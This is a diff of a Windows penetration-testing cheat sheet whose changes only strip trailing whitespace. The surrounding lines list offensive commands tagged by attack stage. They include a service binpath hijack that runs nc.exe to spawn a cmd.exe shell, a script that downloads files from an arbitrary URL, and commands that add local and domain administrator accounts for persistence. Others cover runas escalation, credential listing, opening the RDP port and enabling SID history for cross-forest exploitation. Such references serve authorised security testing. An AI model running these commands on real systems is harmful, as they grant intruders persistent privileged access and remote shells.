@@ -157,7 +157,7 @@ accesschk.exe /accepteula -ucqv <service_name>
 sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
 ```
 
-## change service 
+## change service
 ```
 sc config <service> obj= ".\LocalSystem" password= ""
 ```
@@ -190,7 +190,7 @@ accesschk.exe -uwqs Users <c>:\
 % windows, download
 
 ## VBS download file script
-#cat/ATTACK/FILE_TRANSFERT 
+#cat/ATTACK/FILE_TRANSFERT
 ```
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>
 ```
@@ -198,55 +198,55 @@ echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq
 % windows, users
 
 ## add user
-#cat/PERSIST 
+#cat/PERSIST
 ```
 net user <username> <password> /ADD
 ```
 
 ## add user to domain
-#cat/PERSIST 
+#cat/PERSIST
 ```
 net user <username> <password> /ADD /DOMAIN
 ```
 
 ## add user as admin
-#cat/PERSIST 
+#cat/PERSIST
 ```
 net localgroup administrators <username> /add
 ```
 
 ## run as over user
-#cat/PRIVESC 
+#cat/PRIVESC
 ```
 runas /user:<domain>\<user> cmd.exe
 ```
 
 ## whoami - All info about me, take a look at the enabled tokens
-#cat/PRIVESC  
+#cat/PRIVESC
 ```
 whoami /all
 ```
- 
+
 ## whoami privilegied
-#cat/PRIVESC 
+#cat/PRIVESC
 ```
 whoami /priv #Show only privileges
 ```
 
 ## list all users
-#cat/PRIVESC 
+#cat/PRIVESC
 ```
 net users
 ```
 
 ## list domain admins (fr)
-#plateform/windows  #target/local #cat/RECON 
+#plateform/windows  #target/local #cat/RECON
 ```
 net group "Admins du domaine"
 ```
 
 ## infos about a user
-#cat/RECON 
+#cat/RECON
 ```
 net user <username>
 ```
@@ -257,25 +257,25 @@ net user <username>
 ```
 
 ## infos about password policy
-#cat/RECON 
+#cat/RECON
 ```
 net accounts
 ```
 
-## who logged in 
-#cat/PRIVESC  
+## who logged in
+#cat/PRIVESC
 ```
 qwinsta
 ```
 
 ## List credentials
-#cat/POSTEXPLOIT/CREDS_RECOVER 
+#cat/POSTEXPLOIT/CREDS_RECOVER
 ```
 cmdkey /list
 ```
 
-## show local groups 
-#cat/RECON 
+## show local groups
+#cat/RECON
 ```
 net localgroup
 ```
@@ -358,7 +358,7 @@ net localgroup administrators /domain
 ```
 
 ## List all domain users
-``` 
+```
 net user /domain
 ```
 
@@ -443,7 +443,7 @@ NetSh Advfirewall set allprofiles state on
 
 ## firewall open port RDP
 ```
-netsh firewall add portopening TCP 3389 "Remote Desktop" 
+netsh firewall add portopening TCP 3389 "Remote Desktop"
 ```
 
 % windows, ntds.dit
@@ -503,7 +503,7 @@ nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain_name>
 
 % windows, active directory
 
-## enable sid history 
+## enable sid history
 Enable history on source domain for target domain (useful for forest extra SID exploitation)
 ```
 netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
